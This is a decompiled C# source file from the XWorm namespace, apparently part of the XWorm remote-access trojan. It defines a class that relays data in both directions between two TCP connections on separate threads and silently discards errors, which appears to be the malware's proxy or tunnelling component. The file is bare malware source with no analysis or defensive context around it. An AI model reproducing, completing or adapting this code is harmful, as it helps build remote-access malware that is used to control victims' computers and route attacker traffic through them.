using System;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

internal class Class0
{
	private static Thread thread_0;

	private static Thread thread_1;

	private TcpClient tcpClient_0;

	private TcpClient tcpClient_1;

	private NetworkStream networkStream_0;

	private NetworkStream networkStream_1;

	public void method_0(TcpClient tcpClient_0, TcpClient tcpClient_1)
	{
		this.tcpClient_0 = tcpClient_0;
		this.tcpClient_1 = tcpClient_1;
		networkStream_0 = tcpClient_0.GetStream();
		networkStream_1 = tcpClient_1.GetStream();
		thread_0 = new Thread(method_1);
		thread_1 = new Thread(method_2);
		thread_0.Start();
		thread_1.Start();
	}

	public static void smethod_0()
	{
		try
		{
			thread_0?.Abort();
			thread_1?.Abort();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_1()
	{
		try
		{
			byte[] array = new byte[24577];
			while (true)
			{
				int num = networkStream_0.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				networkStream_1.Write(array, 0, num);
				networkStream_1.Flush();
			}
			networkStream_0.Close();
			tcpClient_0.Close();
			tcpClient_1.Close();
			networkStream_1.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			tcpClient_0.Close();
			tcpClient_1.Close();
			ProjectData.ClearProjectError();
		}
	}

	private void method_2()
	{
		try
		{
			byte[] array = new byte[24577];
			while (true)
			{
				int num = networkStream_1.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				networkStream_0.Write(array, 0, num);
				networkStream_0.Flush();
			}
			networkStream_0.Close();
			tcpClient_0.Close();
			tcpClient_1.Close();
			networkStream_1.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			tcpClient_0.Close();
			tcpClient_1.Close();
			ProjectData.ClearProjectError();
		}
	}
}